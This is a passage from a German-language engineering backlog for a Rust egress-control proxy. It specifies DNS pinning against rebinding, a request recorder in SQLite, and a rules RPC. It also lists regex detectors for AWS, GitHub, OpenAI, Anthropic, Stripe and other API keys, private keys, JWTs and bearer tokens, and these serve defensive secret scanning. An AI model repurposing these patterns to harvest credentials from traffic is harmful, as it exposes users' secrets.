pub struct MockResolver { calls: Mutex<Vec<String>>, answers: HashMap<String, Vec<IpAddr>> }    // Tests

/// Request-Extension, vom Forward-Pfad gesetzt, vom Connector gelesen.
#[derive(Clone, Copy)] pub struct PinnedAddr(pub SocketAddr);

/// tower::Service<Uri> für hyper-util. Liest `PinnedAddr` aus den Request-Extensions (über
/// `hyper_util::client::legacy::connect::Connected`-Mechanik bzw. eigenen Wrapper), öffnet
/// ruft `Egress::connect(authority, Some(ip))` (HUM-015, `Egress::Direct`) mit Timeout `upstream.connect_timeout_secs` (Default 10),
/// bei https anschließend rustls mit `ServerName::try_from(host)` (Zertifikat wird gegen den
/// Hostnamen validiert, nicht gegen die IP). Es gibt keinen Codepfad, der `Uri.host()` auflöst.
pub struct PinnedConnector { tls: Arc<rustls::ClientConfig> }
```

Config-Schlüssel (Tier `expert`): `resolver.nameserver` (optional `IP[:port]`, Default System), `resolver.overrides` (Map Host → IP), `resolver.cache_ttl_secs` (Default 60), `resolver.prefer` (`ipv4|ipv6`, Default `ipv4`), `upstream.connect_timeout_secs` (Default 10), `experimental.upstream_port_map` (Map `"443" → 8443`, nur für Tests, Warnung im Log beim Setzen).

`forward(flow, decision)`-Ablauf:

1. `req` = Original oder editierter Request.
2. `host` = `req.authority.host`. Bei `HostName::Ip(ip)` → `addr = (ip, port)`, kein Resolver-Aufruf.
3. Sonst `ips = resolver.resolve(host).await`; leer oder Fehler → `Decided(Block{NoRoute})` (Flow war bereits `Decided(Allow)`; der Übergang `Decided(Allow) → Decided(Block)` ist verboten, daher: Zustand bleibt `Decided(Allow)`, es wird `Responded{status: 502}` mit synthetischer Antwort und Diagnostic PROXY_004 (`why` = „DNS lookup for `host` failed: …") am Flow gesetzt, dann `Recorded`).
4. Auswahl: erste Adresse nach `resolver.prefer`. Loopback, Link-Local, Multicast und Unspecified werden verworfen, außer `host` war schon eine IP-Regel; ergibt das eine leere Liste → wie 3. (Verhindert Rebinding auf 127.0.0.1.)
5. `req.extensions_mut().insert(PinnedAddr(addr))`, `client.request(req)`.
6. Antwort streamen an Client und Recorder (HUM-026).

### Schritte
1. `Resolver`-Trait, `MockResolver`, `SystemResolver` (hickory) implementieren.
2. `PinnedConnector` implementieren; Test: Verbindung zu `127.0.0.1:PORT` mit `Host: example.test` und selbstsigniertem Zertifikat für `example.test` funktioniert, ohne dass `example.test` auflösbar ist.
3. `forward()` mit Schritt 1–6; Proxy-State bekommt `Arc<dyn Resolver>`.
4. `OverrideResolver` und Config-Schlüssel.
5. Tests unten.
6. `tests/escape/dns-recorder.rs`: kleines Binary, lauscht UDP `127.0.0.1:5353`, schreibt jede Query (QNAME) nach `target/escape/dns.log`. `esc-3.sh` startet es, setzt `HUMANITL_RESOLVER__NAMESERVER=127.0.0.1:5353`, feuert die Blocked-Fälle, prüft, dass `dns.log` keinen der Hostnamen enthält, feuert einen Allow-Fall und prüft, dass genau dieser Hostname erscheint.

### Tests
- `blocked_flow_never_resolves`: Regel `block evil.example`; Request → 403; `mock.calls()` leer.
- `timeout_never_resolves`: `hold.timeout_secs = 1`; keine Entscheidung → TimedOut; `mock.calls()` leer.
- `allow_resolves_once`: Allow → `mock.calls() == ["api.github.com"]`.
- `ip_literal_no_resolve`: Request an `192.168.1.50:11434` mit Regel `allow ip:192.168.1.50` → keine Calls.
- `rebinding_to_loopback_rejected`: Mock antwortet `127.0.0.1` für `evil.example`, Regel allow → 502 mit PROXY_004, keine TCP-Verbindung (Fake-Upstream auf 127.0.0.1 zählt 0 Verbindungen).
- `pinned_addr_used`: Mock antwortet `127.0.0.1`, Fake-Upstream auf `127.0.0.1:8443` mit `upstream_port_map`; Antwort kommt an, Zertifikat wurde gegen den Hostnamen validiert (Test mit falschem CN scheitert mit TLS-Fehler, nicht mit Erfolg).

### Akzeptanzkriterien
- [ ] `grep -rn "lookup_host\|getaddrinfo\|to_socket_addrs" daemon/crates/proxy/src` liefert nur Treffer in `resolver.rs`.
- [ ] Alle Tests oben grün.
- [ ] `esc-3.sh` grün: `dns.log` enthält keinen geblockten Host, genau einen erlaubten.
- [ ] Config-Schema enthält die fünf `resolver.*`/`upstream.*`-Schlüssel mit Tier `expert` und Beschreibung.

### Fallstricke
- `hyper_util::client::legacy::connect::HttpConnector` löst selbst auf. Nicht verwenden; eigener Connector ist Pflicht.
- `reqwest` würde denselben Fehler machen. Kein `reqwest` im Proxy.
- rustls braucht `ServerName::DnsName`, sonst validiert es gegen die IP und scheitert oder, schlimmer, akzeptiert IP-SANs.
- hickory-resolver liest `/etc/resolv.conf` beim Start; in der Sandbox ist keine vorhanden, aber der Daemon läuft auf dem Host, das ist korrekt so.
- Der 502-Fall darf keinen zweiten Auflösungsversuch mit anderem Resolver starten (kein „Fallback auf System-DNS").

### Referenzen
BACKLOG.md ADR-006, 4.1 Kanal 10, 4.5 Test 3; CONVENTIONS.md 3.5; hickory-resolver (https://docs.rs/hickory-resolver); hyper-util Connector (https://docs.rs/hyper-util/latest/hyper_util/client/legacy/connect/); DNS-Rebinding-Schutz wie in coder/boundary (https://github.com/coder/boundary).

---

## HUM-025 · Findings-Detektoren Tier 1
Sprint: 2 · Größe: M · Abhängigkeiten: HUM-004, HUM-062 · Blockiert: HUM-030, HUM-047

### Kontext
Der Mensch ist der Klassifikator, aber ein API-Key in einem 40-KB-JSON fällt ihm nicht auf. Findings markieren Secrets und personenbezogene Daten im Request, bevor der Mensch entscheidet. Tier 1 ist inline-tauglich: nur Regex und Prüfsummen, keine NER-Modelle. Detektoren sind der erste Erweiterungspunkt (BACKLOG.md Abschnitt 6).

### Ziel
Die Crate `humanitl-findings` bietet einen `Detector`-Trait, eine `DetectorRegistry` und die Tier-1-Detektoren. `scan_request` liefert `Finding`s mit Byte-Spans für Header, Query und Body. Nutzer-Terme aus der Konfiguration werden erkannt. Bekannte Hashes werden ignoriert.

### Nicht-Ziel
Pseudonymisierung und Ersetzung (HUM-047/048), Response-Scan, NER, Scan von Bodies über 8 MiB, multipart-Binärteile.

### Betroffene Pfade
- `daemon/crates/findings/src/lib.rs` (neu)
- `daemon/crates/findings/src/registry.rs` (neu)
- `daemon/crates/findings/src/detectors/{secrets,email,iban,card,phone,ipv4,user_terms}.rs` (neu)
- `daemon/crates/findings/src/rules/secrets.toml` (neu, Regex-Set im gitleaks-Format)
- `daemon/crates/findings/src/input.rs` (neu, Zerlegung eines Requests in Scan-Ziele, Dekodierung)
- `daemon/crates/findings/tests/*.rs` (neu)
- `daemon/crates/config` (ändern: `findings.*`)

### Spezifikation

```rust
pub trait Detector: Send + Sync {
    fn id(&self) -> &'static str;                           // "secrets", "email", "iban", "card", "phone", "ipv4", "user_terms"
    fn scan(&self, input: &ScanInput<'_>) -> Vec<Finding>;   // Spans relativ zu input.bytes
}
pub struct ScanInput<'a> { pub location: FindingLocation, pub bytes: &'a [u8], pub content_type: Option<&'a Mime> }

pub struct DetectorRegistry { detectors: Vec<Box<dyn Detector>>, ignored: HashSet<[u8; 32]> }
impl DetectorRegistry {
    pub fn tier1(cfg: &FindingsConfig) -> Self;
    pub fn register(&mut self, d: Box<dyn Detector>);
    /// Zerlegt den Request in Scan-Ziele und sammelt Findings aller Detektoren, dedupliziert
    /// (gleiche location + span → behalte höchsten Tier), sortiert nach location, span.start.
    pub fn scan_request(&self, req: &HttpRequest, body: &[u8]) -> Vec<Finding>;
}
```

Scan-Ziele (`input.rs`):

1. Jeder Header-Wert einzeln: `FindingLocation::Header(name)`, Bytes = Rohwert. Kein Header ausgenommen.
2. Query: `FindingLocation::Query`, Bytes = roher Query-String (ohne `?`). Zusätzlich wird eine percent-dekodierte Kopie gescannt; Spans der dekodierten Treffer werden über eine Offset-Tabelle (dekodierter Index → roher Index) auf den Roh-String abgebildet.
3. Body: `FindingLocation::Body`. Vorverarbeitung: `Content-Encoding` gzip/deflate/br dekomprimieren (Crates `flate2`, `brotli`) mit Limit `preview.cap_bytes` (8 MiB) und Ratio-Limit `preview.max_decompress_ratio` (100); darüber abbrechen, Finding-Scan mit `truncated = true` markieren (Feld in `AnalyzedMeta`). Spans beziehen sich auf den dekodierten Body. Textartig (`text/*`, `application/json`, `application/x-www-form-urlencoded`, `application/xml`, `+json`, `+xml`, `multipart/form-data` Textteile): kompletter Scan. Sonst „strings"-Modus: nur Runs aus ≥ 8 druckbaren ASCII-Bytes werden gescannt.

Tier-1-Detektoren und Muster (alle Regexes mit `regex::bytes`, `RegexSet` als Vorfilter):

| Detektor | `FindingKind` | Tier | Muster / Verfahren |
|---|---|---|---|
| secrets | `ApiKey("aws")` | Regex | `\b(?:A3T[A-Z0-9]\|AKIA\|ASIA\|ABIA\|ACCA)[A-Z0-9]{16}\b` (gitleaks `aws-access-token`) |
| secrets | `ApiKey("github")` | Regex | `\b(?:ghp\|gho\|ghu\|ghs\|ghr)_[0-9A-Za-z]{36}\b` und `\bgithub_pat_[0-9A-Za-z_]{82}\b` |
| secrets | `ApiKey("openai")` | Regex | `\bsk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}\b` und `\bsk-(?:proj\|svcacct\|admin)-[A-Za-z0-9_-]{20,}\b` |
| secrets | `ApiKey("anthropic")` | Regex | `\bsk-ant-api03-[A-Za-z0-9_-]{93}AA\b` |
| secrets | `ApiKey("slack")` | Regex | `\bxox[baprs]-[0-9A-Za-z-]{10,72}\b` |
| secrets | `ApiKey("stripe")` | Regex | `\b(?:sk\|rk)_(?:live\|test)_[0-9A-Za-z]{24,99}\b` |
| secrets | `ApiKey("google")` | Regex | `\bAIza[0-9A-Za-z_-]{35}\b` |
| secrets | `ApiKey("private_key")` | Regex | `-----BEGIN (?:RSA \|EC \|OPENSSH \|DSA \|PGP )?PRIVATE KEY-----` |
| secrets | `ApiKey("bearer")` | Regex | nur `Header(authorization)`: `(?i)^bearer\s+([A-Za-z0-9._~+/-]{20,}=*)$`, Span = Gruppe 1 |
| secrets | `ApiKey("basic")` | Regex | nur `Header(authorization)`: `(?i)^basic\s+([A-Za-z0-9+/]{8,}=*)$` |
| secrets | `Jwt` | Regex | `\bey[A-Za-z0-9]{17,}\.ey[A-Za-z0-9/\\_-]{17,}\.(?:[A-Za-z0-9/\\_-]{10,}={0,2})?` (gitleaks `jwt`) |
| email | `Email` | Regex | `\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b`; Treffer, deren Domain in `findings.email_allow_domains` liegt, werden verworfen |
| iban | `Iban` | Checksum | Kandidat `\b[A-Z]{2}[0-9]{2}(?:[ ]?[0-9A-Z]{4}){2,7}[0-9A-Z]{1,4}\b`; Leerzeichen entfernen; Länge 15..=34; erste 4 Zeichen ans Ende; Buchstaben → `A=10 … Z=35`; iterativ `rest = (rest*10 + digit) % 97` über alle Ziffern; Treffer bei `rest == 1` |
| card | `CreditCard` | Checksum | Kandidat `\b(?:[0-9][ -]?){12,18}[0-9]\b`; Trennzeichen entfernen; Länge 13..=19; Luhn (von rechts jede zweite Ziffer verdoppeln, >9 → −9, Summe % 10 == 0); Präfix in `4`, `51-55`, `2221-2720`, `34`, `37`, `6011`, `65`, `35` |
| phone | `Phone` | Regex | international nur: `(?:\+\|00)[1-9][0-9 .\-/()]{6,20}[0-9]`; nach Entfernen der Trenner 8..=15 Ziffern |
| ipv4 | `Ipv4` | Regex | `\b(?:(?:25[0-5]\|2[0-4][0-9]\|1?[0-9]?[0-9])\.){3}(?:25[0-5]\|2[0-4][0-9]\|1?[0-9]?[0-9])\b`; `127.0.0.0/8`, `0.0.0.0`, `255.255.255.255` verworfen; Severity Info |
| user_terms | `UserTerm(term)` | UserTerm | `aho_corasick::AhoCorasick` mit `ascii_case_insensitive(true)`, `MatchKind::LeftmostLongest`; Treffer nur an Wortgrenzen (Byte davor/danach nicht alphanumerisch) |

Weitere Felder pro Finding: `value_hash = SHA-256(matched bytes)`; `display_prefix`: `ApiKey`/`Jwt` erste 6 Zeichen + `…`; `Email` erstes Zeichen + `***@` + Domain; `Iban` erste 4 + ` …`; `CreditCard` `**** ` + letzte 4; `Phone` erste 4 + `…`; `Ipv4` voll; `UserTerm` voll.

Config (`findings.*`): `findings.enabled` (Liste Detektor-IDs, Default alle sieben, Tier `advanced`), `findings.user_terms` (Liste, Tier `basic`, Beschreibung „Kundennamen, Projektnamen, alles, was nie nach außen soll"), `findings.email_allow_domains` (Liste, Default leer, Tier `advanced`), `findings.ignored_hashes` (Liste hex, Tier `expert`, wird von „Ignore always" befüllt).

### Schritte
1. Crate anlegen, `Detector`, `ScanInput`, `DetectorRegistry` mit `register`/`scan_request` (noch ohne Detektoren), Deduplikation und Sortierung testen.
2. `input.rs`: Header/Query/Body-Zerlegung, Percent-Decode-Offset-Tabelle, Dekompression mit Limits. Tests mit gzip-Bombe (1 KB → 1 GB): Abbruch bei Ratio 100, `truncated = true`.
3. `secrets.rs` mit `secrets.toml` (Format: `[[rules]] id, regex, kind, header_only = "authorization"`), `RegexSet`-Vorfilter, dann Einzelregex für Spans.
4. `email.rs`, `iban.rs` (mod-97), `card.rs` (Luhn), `phone.rs`, `ipv4.rs`, `user_terms.rs`.
5. `tier1(cfg)` verdrahtet Detektoren nach `findings.enabled`, lädt `ignored_hashes`.
6. Proxy-Pipeline (HUM-023 Schritt 4) ruft `scan_request` und emittiert `Analyzed{findings}`.

### Tests
- `iban_valid`: `DE89 3704 0044 0532 0130 00` → ein Finding Tier Checksum, Span deckt den ganzen String inklusive Leerzeichen.
- `iban_invalid_checksum`: `DE89 3704 0044 0532 0130 01` → kein Finding.
- `card_luhn_valid`: `4111 1111 1111 1111` → Finding; `4111 1111 1111 1112` → keins.
- `jwt_detected`: Beispiel-JWT aus RFC 7519 → `Jwt`.
- `github_pat`: `ghp_` + 36 Zeichen → Finding; 35 Zeichen → keins.
- `bearer_header_only`: `Authorization: Bearer abcdefghijklmnopqrstuvwxyz0123` → Finding mit `location = Header(authorization)`, Span nur der Token; derselbe String im Body → kein `bearer`-Finding.
- `email_allow_domain`: `x@example.com` mit `email_allow_domains = ["example.com"]` → keins.
- `query_decoded_span`: Query `q=user%40example.com` → Finding Email, Span zeigt auf `user%40example.com` im Rohstring.
- `user_term_word_boundary`: Term `Acme`, Body `Acme Corp` → Finding; `Acmeified` → keins; `ACME` → Finding.
- `strings_mode_binary`: 1 MB Zufallsbytes mit eingebettetem `AKIA…` → Finding.
- `gzip_bomb_truncated`.
- `ignored_hash_skipped`.
- `dedupe_keeps_highest_tier`: Wert, der Email-Regex und User-Term trifft → ein Finding mit Tier `UserTerm`.
- Benchmark (criterion, nicht in CI-Gate): 8 MiB JSON in < 200 ms.

### Akzeptanzkriterien
- [ ] Alle Tests grün; Benchmark-Zahl in der PR-Beschreibung.
- [ ] `secrets.toml` hat für jede Regel ein Feld `source` mit gitleaks-Regel-ID oder „humanitl".
- [ ] Spans sind immer innerhalb `bytes.len()` (Property-Test mit zufälligen Eingaben).
- [ ] Config-Schema enthält die vier `findings.*`-Schlüssel mit Tier.

### Fallstricke
- `\b` in `regex::bytes` ist ASCII-Wortgrenze; für Email vor `@` reicht das, für User-Terms mit Umlauten (`Müller`) eigene Grenzprüfung über `char::is_alphanumeric` auf UTF-8-Dekodierung des Nachbarn.
- Keine Regex mit verschachtelten Quantifizierern über unbegrenzten Klassen; der `regex`-Crate ist linear, aber die DFA-Größe kann explodieren; `size_limit` setzen.
- Percent-Decoding kann `%00` erzeugen; die Offset-Tabelle muss trotzdem monoton bleiben.
- Dekomprimierte Bodies nie unbegrenzt in den Speicher; `take(cap)` plus Ratio-Zähler.
- Findings in `Header(authorization)` nicht loggen als Klartext: der Recorder speichert Header vollständig (das ist gewollt, es ist die Aufzeichnung), aber Diagnostics und Logs dürfen nur `display_prefix` enthalten.

### Referenzen
BACKLOG.md 4.3, Abschnitt 6 (Detector als Erweiterungspunkt); CONVENTIONS.md 3.2; gitleaks Default-Config (https://github.com/gitleaks/gitleaks/blob/master/config/gitleaks.toml); IBAN mod-97 (ISO 13616); Luhn (ISO/IEC 7812); `aho-corasick` (https://docs.rs/aho-corasick).

---

## HUM-026 · Recorder
Sprint: 2 · Größe: M · Abhängigkeiten: HUM-004, HUM-062 · Blockiert: HUM-027, HUM-032, HUM-050, HUM-065

### Kontext
Setzt ADR-008 um. Alles wird aufgezeichnet: Requests, editierte Requests, Responses (gestreamt), Findings, Entscheidungen. Die History-Tabelle und der Export lesen ausschließlich aus dem Recorder; die UI hält nie mehr als eine Seite im Speicher.

### Ziel
Die Crate `humanitl-recorder` schreibt Flows, Messages und Findings in SQLite (WAL) mit Blob-Store für große Bodies, konsumiert `FlowEvent`s über einen dedizierten Writer-Thread und beantwortet `ListFlows`-Anfragen mit Filter-Grammatik, serverseitiger Sortierung und Cursor-Paging.

### Nicht-Ziel
Audit-Hash-Kette (HUM-050), Pseudonym-Tabelle (HUM-048, Migration V3), Retention-Job (HUM-051), Export-Formate (HUM-032 baut HAR in der UI aus `GetFlow`/`GetBody`).

### Betroffene Pfade
- `daemon/crates/recorder/src/{lib,schema,writer,query,blob,filter}.rs` (neu)
- `daemon/crates/recorder/migrations/V1__init.sql` (neu), `V2__rules_snapshot.sql` (neu)
- `daemon/crates/recorder/tests/*.rs` (neu)

### Spezifikation

`V1__init.sql`:

```sql
CREATE TABLE sessions (
  id              TEXT PRIMARY KEY,
  started_at      INTEGER NOT NULL,          -- Unix-Millisekunden UTC
  ended_at        INTEGER,
  sandbox_profile TEXT NOT NULL,
  llm_endpoint    TEXT,
  work_dir        TEXT NOT NULL,
  agent           TEXT NOT NULL
);

CREATE TABLE flows (
  id             TEXT PRIMARY KEY,
  session_id     TEXT NOT NULL REFERENCES sessions(id),
  seq            INTEGER NOT NULL,           -- laufende Nummer pro Session, 1-basiert
  ts             INTEGER NOT NULL,           -- Received, Unix-ms
  method         TEXT NOT NULL,
  scheme         TEXT NOT NULL,              -- http | https
  host           TEXT NOT NULL,              -- A-Label, lowercase
  host_display   TEXT NOT NULL,              -- U-Label
  port           INTEGER NOT NULL,
  path           TEXT NOT NULL,              -- path_and_query
  upgrade        TEXT,                       -- websocket | NULL
  state          TEXT NOT NULL,              -- received|analyzed|held|decided|forwarded|responded|recorded
  decision       TEXT,                       -- allow|allow_edited|block|timed_out
  block_reason   TEXT,                       -- user|rule|timeout|body_cap|authority_mismatch|no_route
  rule_id        TEXT,
  passthrough    INTEGER NOT NULL DEFAULT 0, -- 1 = LLM-Passthrough
  status         INTEGER,                    -- HTTP-Status der Response
  duration_ms    INTEGER,                    -- Received bis Responded
  held_ms        INTEGER,                    -- Held bis Decided
  edited         INTEGER NOT NULL DEFAULT 0,
  findings_count INTEGER NOT NULL DEFAULT 0,
  request_size   INTEGER NOT NULL DEFAULT 0,
  response_size  INTEGER,
  apex           TEXT,                       -- PSL-Apex
  catalog_id     TEXT,
  UNIQUE (session_id, seq)
);
CREATE INDEX flows_ts        ON flows(ts DESC, id);
CREATE INDEX flows_session   ON flows(session_id, ts DESC);
CREATE INDEX flows_host      ON flows(host);
CREATE INDEX flows_state     ON flows(state);
CREATE INDEX flows_decision  ON flows(decision);

CREATE TABLE messages (
  flow_id          TEXT NOT NULL REFERENCES flows(id),
  dir              TEXT NOT NULL,            -- request | request_edited | response
  headers_json     TEXT NOT NULL,            -- [["name","value"],...] in Originalreihenfolge
  content_type     TEXT,
  content_encoding TEXT,
  body_inline      BLOB,                     -- wenn size <= recorder.inline_max_bytes
  blob_sha256      BLOB,                     -- sonst Referenz in den Blob-Store (32 Bytes)
  size             INTEGER NOT NULL,         -- Bytes wie gesendet (roh, nicht dekomprimiert)
  truncated        INTEGER NOT NULL DEFAULT 0,
  PRIMARY KEY (flow_id, dir)
);

CREATE TABLE findings (
  flow_id        TEXT NOT NULL REFERENCES flows(id),
  idx            INTEGER NOT NULL,
  kind           TEXT NOT NULL,              -- z. B. api_key:github, email, iban
  location       TEXT NOT NULL,              -- header:<name> | query | body
  span_start     INTEGER NOT NULL,
  span_end       INTEGER NOT NULL,
  tier           TEXT NOT NULL,              -- checksum | regex | user_term
  value_hash     BLOB NOT NULL,
  display_prefix TEXT NOT NULL,
  resolved       TEXT,                       -- NULL | replaced | ignored
  PRIMARY KEY (flow_id, idx)
);
CREATE INDEX findings_hash ON findings(value_hash);
```

`V2__rules_snapshot.sql` (damit History gelöschte Regeln noch anzeigen kann; `rules.yaml` bleibt Quelle der Wahrheit):

```sql
CREATE TABLE rules_snapshot (
  id         TEXT PRIMARY KEY,
  yaml       TEXT NOT NULL,
  first_seen INTEGER NOT NULL,
  deleted_at INTEGER
);
```

Verbindungs-Setup beim Öffnen: `PRAGMA journal_mode=WAL; PRAGMA synchronous=NORMAL; PRAGMA foreign_keys=ON; PRAGMA busy_timeout=5000;` Migrationen mit `refinery` (embed `migrations/`).

Blob-Store: Pfad `$XDG_DATA_HOME/humanitl/blobs/<hex[0..2]>/<hex>` (64 Hex-Zeichen). Schreiben: Temp-Datei im selben Verzeichnis, `fsync`, `rename`. Existiert die Datei bereits → nichts tun (content-addressed). Lesen über `BodyRef`.

Writer: `rusqlite::Connection` ist `!Sync`; der Recorder besitzt einen Thread mit `std::sync::mpsc::Receiver<WriterCmd>`; öffentliche Handle `Recorder` ist `Clone + Send + Sync` und schickt Kommandos. Der Thread bündelt Schreibvorgänge: Transaktion wird geöffnet beim ersten Kommando, committed nach 50 ms oder 100 Kommandos. Lesezugriffe (`list_flows`, `get_flow`) laufen auf einer separaten Read-Only-Verbindung (`OpenFlags::SQLITE_OPEN_READ_ONLY`) im Aufrufer-Kontext via `tokio::task::spawn_blocking`.

```rust
#[derive(Clone)] pub struct Recorder { tx: mpsc::Sender<WriterCmd>, read: Arc<ReadPool>, blobs: Arc<BlobStore> }
impl Recorder {
    pub fn open(db: &Path, blobs: &Path, cfg: &RecorderConfig) -> Result<Self, Diagnostic>;   // RECORDER_001 bei Fehler
    pub fn start_session(&self, meta: &SessionMeta);
    pub fn end_session(&self, id: SessionId);
    pub fn apply(&self, ev: &FlowEvent);                       // upsert flows-Zeile je Event
    pub async fn store_message(&self, flow: FlowId, dir: Dir, headers: &HeaderMap, body: Bytes) -> BodyRef;
    pub fn begin_response(&self, flow: FlowId, headers: &HeaderMap) -> ResponseSink;
    pub fn store_findings(&self, flow: FlowId, findings: &[Finding]);
    pub fn snapshot_rule(&self, rule: &Rule);
    pub async fn list_flows(&self, q: &FlowQuery) -> Result<FlowPage, RecorderError>;
    pub async fn get_flow(&self, id: FlowId) -> Result<Option<FlowDetail>, RecorderError>;
    pub async fn read_body(&self, r: &BodyRef) -> Result<Bytes, RecorderError>;
}
pub struct ResponseSink { /* hasht inkrementell, puffert bis inline_max, danach Temp-Datei */ }
impl ResponseSink { pub fn chunk(&mut self, b: &[u8]); pub fn finish(self, status: u16) -> BodyRef; pub fn abort(self); }
```

`apply(ev)`-Mapping: `Received` → INSERT flows (state received, seq = max(seq)+1 der Session); `Analyzed` → state analyzed, findings_count; `Held` → state held; `Decided` → state decided, decision, block_reason, rule_id, held_ms, edited; `Forwarded` → forwarded; `ResponseHeaders` → status; `Recorded` → recorded, duration_ms, response_size; `TimedOut` → decision timed_out, block_reason timeout.

Filter-Grammatik (`filter.rs`), identisch für UI-Filterleiste, `ListFlows.filter` und CLI:

```
query   := term (WS term)*
term    := key ':' value | word
key     := host | apex | state | method | decision | reason | rule | status | since | until | findings | session | path | edited | passthrough | upgrade
value   := (cmp)? atom
cmp     := '>=' | '<=' | '>' | '<'
atom    := '"' [^"]* '"' | [^\s]+
```

Semantik: `host:v` → `host = v OR host LIKE '%.' || v` (Label-Suffix); `apex:v` → `apex = v`; `state`, `method`, `decision`, `reason`, `rule`, `session`, `upgrade` → Gleichheit; `status:>=400`; `findings:>0`; `since:`/`until:` akzeptieren ISO-8601 oder relative Dauer `10m`, `2h`, `1d`, `1w`; `path:v` → `path LIKE '%v%'`; `edited:true`, `passthrough:false`; `word` → `(host LIKE '%w%' OR path LIKE '%w%')`. Mehrere Terme = AND. Unbekannter Key → `RecorderError::Filter(Diagnostic RECORDER_002, why nennt den Key und die Liste gültiger Keys)`.

```rust
pub struct FlowQuery { pub filter: String, pub sort: SortKey /* Ts (Default) | Host | Duration | Size */, pub desc: bool, pub limit: u32 /* Default 200, max 1000 */, pub cursor: Option<Cursor> }
pub struct Cursor { pub ts: i64, pub id: String }     // Keyset: WHERE (ts, id) < (?, ?) bei desc
pub struct FlowPage { pub rows: Vec<FlowSummary>, pub next: Option<Cursor>, pub total_estimate: u64 }
```

`FlowSummary` enthält alle Spalten von `flows`, keine Bodies. `FlowDetail` = Summary + `messages` (Header + `BodyRef`) + `findings`.

### Schritte
1. Migrationen, `open`, PRAGMAs, Test „öffnet zweimal, WAL aktiv".
2. Writer-Thread mit Batching; `apply` für alle Events; Test, dass 1000 Events in < 1 s persistiert sind und `seq` lückenlos ist.
3. Blob-Store, `store_message`, `read_body`, `ResponseSink`.
4. Filter-Parser mit Tests pro Key und Fehlerfall.
5. `list_flows` mit Keyset-Cursor, `get_flow`.
6. Proxy-Pipeline: `apply` auf jedes Event, `store_message` nach Body-Puffer, `begin_response` in `forward()`, `store_findings` nach Scan.

### Tests
- `wal_enabled`: `PRAGMA journal_mode` liefert `wal`.
- `seq_monotonic_per_session`.
- `inline_vs_blob`: 100 KB → `body_inline`; 300 KB → `blob_sha256` gesetzt, Datei existiert, Inhalt gleich.
- `response_sink_streaming`: 10 MiB in 1-KB-Chunks → `size = 10 MiB`, Hash korrekt, Peak-Speicher des Sinks < 1 MiB (Temp-Datei ab inline_max).
- `filter_host_suffix`: `host:github.com` trifft `api.github.com`, nicht `evil-github.com`.
- `filter_since_relative`: `since:10m`.
- `filter_unknown_key_diag`: `foo:bar` → RECORDER_002.
- `cursor_paging_no_dupes_no_gaps`: 500 Flows, limit 200, drei Seiten → 500 eindeutige IDs.
- `concurrent_read_during_write`: Writer schreibt 10k Events, parallel 50 `list_flows` → keine `SQLITE_BUSY`-Fehler.

### Akzeptanzkriterien
- [ ] Alle Tests grün; `cargo test -p humanitl-recorder` unter 20 s.
- [ ] Schema-Datei entspricht exakt dem SQL oben (Reviewer diffed).
- [ ] `list_flows` mit 100k Zeilen und `host:`-Filter antwortet in < 50 ms (Test mit generierten Daten, Zahl in PR).
- [ ] Kein `unwrap()` im Writer-Thread; Fehler landen als Diagnostic RECORDER_003 im `diagnosticsProvider`-Stream, der Thread stirbt nicht.

### Fallstricke
- SQLite ohne WAL blockiert Leser während Schreibvorgängen; `journal_mode` muss vor der ersten Transaktion gesetzt werden.
- `seq` über `SELECT MAX(seq)` innerhalb derselben Transaktion wie das INSERT, sonst Race.
- `LIKE '%v%'` ohne Escape: `%` und `_` im Nutzer-Filter escapen (`ESCAPE '\'`).
- Keyset-Cursor braucht `(ts, id)` in genau der Index-Reihenfolge, sonst Full Scan.
- Bodies, die kleiner als `inline_max` sind, nicht zusätzlich in den Blob-Store schreiben (doppelte Speicherung).
- `ResponseSink::finish` erst nach dem letzten Chunk; bei Client-Abbruch `abort()` und Flow auf `Recorded` mit `truncated = 1`.

### Referenzen
BACKLOG.md ADR-008, 3.4; CONVENTIONS.md 3.4 (Pfade), 3.5 (Defaults); SQLite WAL (https://www.sqlite.org/wal.html); refinery (https://docs.rs/refinery); rusqlite (https://docs.rs/rusqlite).

---

## HUM-027 · Rules-RPCs
Sprint: 2 · Größe: S · Abhängigkeiten: HUM-003, HUM-018, HUM-022, HUM-026 · Blockiert: HUM-028, HUM-033, HUM-065

### Kontext
Die UI und die CLI verwalten Regeln ausschließlich über den Daemon. Persistente Regeln leben in `rules.yaml`, Session-Regeln nur im Speicher. Dry-Run zeigt vor dem Speichern, welche vergangenen Flows eine Regel getroffen hätte.

### Ziel
`Rules`-RPC mit `list`, `add`, `update`, `remove`, `reorder`, `dry_run`, `reload`. `Decide` akzeptiert optional `remember: Rule`, die atomar mit der Entscheidung angelegt wird. Persistente Änderungen schreiben `rules.yaml` atomar; Session-Regeln werden nie in die Datei geschrieben.

### Nicht-Ziel
Datei-Watcher (Post-MVP), Regel-Import/Export, UI.

### Betroffene Pfade
- `proto/humanitl/v1/rules.proto` (neu) und `humanitl.proto` (ändern: Import, `DecideRequest.remember`)
- `daemon/crates/ipc/src/rules.rs` (neu)
- `daemon/crates/proxy/src/rules_store.rs` (neu: `RulesStore` = persistente + Session-Regeln, Datei-IO)
- `daemon/crates/ipc/tests/rules_rpc.rs` (neu)

### Spezifikation

```proto
// rules.proto
enum RuleAction { RULE_ACTION_UNSPECIFIED = 0; ALLOW = 1; BLOCK = 2; ASK = 3; REDACT = 4; }
message RuleMatch { string host = 1; repeated string methods = 2; string path = 3; string scheme = 4; uint32 port = 5; string upgrade = 6; }
message RuleExpiry { oneof kind { bool never = 1; string session_id = 2; google.protobuf.Timestamp at = 3; } }
message Rule {
  string id = 1; RuleAction action = 2; RuleMatch match = 3; RuleExpiry expires = 4; bool stream = 5;
  string created_from = 6; bool bundled = 7; string note = 8; google.protobuf.Timestamp created_at = 9;
  uint32 position = 10;
}
message ListRules {}
message AddRule { Rule rule = 1; optional uint32 position = 2; }
message UpdateRule { Rule rule = 1; }
message RemoveRule { string id = 1; }
message ReorderRule { string id = 1; uint32 position = 2; }
message DryRun { Rule rule = 1; uint32 scan_last = 2; }        // Default 500
message ReloadRules {}
message RulesRequest { oneof op { ListRules list = 1; AddRule add = 2; UpdateRule update = 3; RemoveRule remove = 4; ReorderRule reorder = 5; DryRun dry_run = 6; ReloadRules reload = 7; } }
message DryRunHit { string flow_id = 1; RuleAction action = 2; }
message DryRunResult { repeated DryRunHit hits = 1; uint32 scanned = 2; }
message RulesResponse { repeated Rule rules = 1; repeated Diagnostic diagnostics = 2; DryRunResult dry_run = 3; }
```

